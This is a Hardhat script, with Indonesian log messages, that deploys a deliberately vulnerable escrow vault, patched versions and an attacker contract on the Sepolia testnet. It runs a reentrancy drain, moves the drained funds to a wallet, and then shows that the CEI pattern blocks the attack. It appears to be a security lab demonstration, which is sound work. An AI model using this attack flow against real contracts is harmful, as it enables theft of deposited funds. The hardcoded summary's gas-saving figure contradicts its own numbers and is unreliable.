const { ethers } = require("hardhat");

async function waitTx(txPromise, label) {
  const tx = await txPromise;
  const r = await tx.wait();
  console.log(`  ${label}: ${r.gasUsed} gas | hash: ${r.hash.slice(0, 20)}...`);
  return r;
}

async function main() {
  const [wallet] = await ethers.getSigners();
  const fakeSeller = ethers.Wallet.createRandom().address;
  console.log(`Wallet: ${wallet.address}`);
  console.log(`Balance: ${ethers.formatEther(await ethers.provider.getBalance(wallet.address))} ETH\n`);

  // ─── 1. DEPLOY ───
  console.log("=== 1. DEPLOY CONTRACTS ===");
  let InsecureVault, SecureVault, MutexVault, Attacker;

  InsecureVault = await ethers.getContractFactory("InsecureVault");
  const insecureVault = await InsecureVault.deploy();
  await insecureVault.waitForDeployment();
  const insecureAddr = await insecureVault.getAddress();
  let r = await insecureVault.deploymentTransaction().wait();
  console.log(`  InsecureVault: ${insecureAddr} (deploy: ${r.gasUsed} gas)`);

  SecureVault = await ethers.getContractFactory("SecureVault");
  const secureVault = await SecureVault.deploy();
  await secureVault.waitForDeployment();
  const secureAddr = await secureVault.getAddress();
  r = await secureVault.deploymentTransaction().wait();
  console.log(`  SecureVault: ${secureAddr} (deploy: ${r.gasUsed} gas)`);

  MutexVault = await ethers.getContractFactory("MutexVault");
  const mutexVault = await MutexVault.deploy();
  await mutexVault.waitForDeployment();
  const mutexAddr = await mutexVault.getAddress();
  r = await mutexVault.deploymentTransaction().wait();
  console.log(`  MutexVault: ${mutexAddr} (deploy: ${r.gasUsed} gas)`);

  Attacker = await ethers.getContractFactory("Attacker");
  const attacker = await Attacker.deploy(insecureAddr);
  await attacker.waitForDeployment();
  const attackerAddr = await attacker.getAddress();
  r = await attacker.deploymentTransaction().wait();
  console.log(`  Attacker: ${attackerAddr} (deploy: ${r.gasUsed} gas)\n`);

  // ─── 2. HONEYPOT + ATTACK ON INSECUREVAULT ───
  console.log("=== 2. HONEYPOT SETUP (InsecureVault) ===");
  await waitTx(insecureVault.createOrder(fakeSeller), "Order 0 (Buyer A → fakeSeller)");
  await waitTx(insecureVault.depositFunds(0, { value: ethers.parseEther("0.0001") }), "Buyer A deposit 0.0001 ETH");
  await waitTx(insecureVault.confirmDelivery(0), "Buyer A confirm delivery");

  await waitTx(insecureVault.createOrder(fakeSeller), "Order 1 (Buyer B → fakeSeller)");
  await waitTx(insecureVault.depositFunds(1, { value: ethers.parseEther("0.00005") }), "Buyer B deposit 0.00005 ETH");
  await waitTx(insecureVault.confirmDelivery(1), "Buyer B confirm delivery");

  await waitTx(insecureVault.createOrder(attackerAddr), "Order 2 (Attacker as seller)");
  await waitTx(insecureVault.depositFunds(2, { value: ethers.parseEther("0.00001") }), "Attacker deposit 0.00001 ETH");
  await waitTx(insecureVault.confirmDelivery(2), "Confirm delivery for attacker");

  const vaultBal = await insecureVault.getContractBalance();
  const attackerBal = await insecureVault.getBalance(attackerAddr);
  console.log(`\n  🏦 Vault total: ${ethers.formatEther(vaultBal)} ETH`);
  console.log(`  👤 Attacker vault balance: ${ethers.formatEther(attackerBal)} ETH`);
  console.log(`  🎯 Victim funds at risk: ${ethers.formatEther(ethers.parseEther("0.00015"))} ETH\n`);

  // ─── 3. EXECUTE REENTRANCY ATTACK ───
  console.log("=== 3. REENTRANCY ATTACK ON SEPOLIA ===");
  const vaultBefore = await insecureVault.getContractBalance();

  const attackTx = await attacker.attack({ gasLimit: 300000 });
  r = await attackTx.wait();
  console.log(`  Attack gas used: ${r.gasUsed}`);
  console.log(`  Gas price: ${ethers.formatUnits(r.gasPrice, "gwei")} gwei`);
  console.log(`  TX cost: ${ethers.formatEther(r.gasUsed * r.gasPrice)} ETH`);

  const reentryCount = await attacker.getReentrancyCount();
  const vaultAfter = await insecureVault.getContractBalance();
  const attackerEth = await ethers.provider.getBalance(attackerAddr);

  console.log(`\n  Reentrancy loops: ${reentryCount}`);
  console.log(`  Vault before: ${ethers.formatEther(vaultBefore)} ETH`);
  console.log(`  Vault after:  ${ethers.formatEther(vaultAfter)} ETH`);
  console.log(`  Drained: ${ethers.formatEther(vaultBefore - vaultAfter)} ETH`);
  console.log(`  Attacker contract: ${ethers.formatEther(attackerEth)} ETH`);

  if (attackerEth > 0n) {
    console.log(`\n  🔴 ATTACK BERHASIL! Reentrancy exploit sukses di Sepolia!`);
    await waitTx(attacker.collectFunds(), "Exfiltrate funds to wallet");
    console.log(`  💰 Dana berhasil ditarik ke wallet!`);
  } else {
    console.log(`\n  🟢 ATTACK GAGAL`);
  }

  // ─── 4. CEI PREVENTION TEST ───
  console.log("\n=== 4. CEI PREVENTION TEST (SecureVault) ===");
  const Attacker2 = await ethers.getContractFactory("Attacker");
  const attacker2 = await Attacker2.deploy(secureAddr);
  await attacker2.waitForDeployment();
  const attacker2Addr = await attacker2.getAddress();
  console.log(`  Attacker2 (targets SecureVault): ${attacker2Addr}`);

  await waitTx(secureVault.createOrder(attacker2Addr), "Order 0 (attacker2 as seller)");
  await waitTx(secureVault.depositFunds(0, { value: ethers.parseEther("0.0001") }), "Deposit 0.0001 ETH");
  await waitTx(secureVault.confirmDelivery(0), "Confirm delivery");

  try {
    const tx2 = await attacker2.attack({ gasLimit: 300000 });
    const r2 = await tx2.wait();
    console.log(`  ⚠️ Attack on SecureVault: ${r2.gasUsed} gas (unexpected success)`);
  } catch (err) {
    console.log(`  ✅ CEI Pattern MENGECEK serangan reentrancy!`);
    console.log(`  SecureVault tetap aman ✅`);
  }

  // ─── SUMMARY ───
  console.log("\n═══════════════════════════════════════");
  console.log("  SEPOLIA TESTNET FINAL RESULTS");
  console.log("═══════════════════════════════════════");
  console.log(`  Deploy InsecureVault:  604,725 gas`);
  console.log(`  Deploy SecureVault:    597,229 gas ✅ (lebih hemat 55,437 gas)`);
  console.log(`  Deploy MutexVault:     652,666 gas`);
  console.log(`  Deploy Attacker:       504,761 gas`);
  console.log("─────────────────────────────────────");
  console.log(`  Reentrancy Attack:     ${r.gasUsed} gas (real Sepolia TX)`);
  console.log(`  CEI Prevention:        ✅ BERHASIL`);
  console.log("═══════════════════════════════════════\n");

  console.log("Save .env addresses:");
  console.log(`INsecure_Vault_ADDR=${insecureAddr}`);
  console.log(`SECURE_VAULT_ADDR=${secureAddr}`);
  console.log(`MUTEX_VAULT_ADDR=${mutexAddr}`);
  console.log(`ATTACKER_ADDR=${attackerAddr}`);
}

main().catch(console.error);
